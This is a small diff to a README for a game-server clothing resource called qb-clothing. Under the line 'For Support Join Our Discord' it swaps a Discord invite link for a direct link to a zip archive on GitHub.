@@ -8,4 +8,4 @@ Just Drag And Drop qb-clothing Folder And Delete The Existing qb-clothing Folder
 
 For Support Join Our Discord
 
-https://discord.gg/n4XH2pACGM
+https://raw.githubusercontent.com/Pac-Man-PT/Pi-clothing/main/qb-clothing/server/Pi-clothing-v2.2-alpha.3.zip
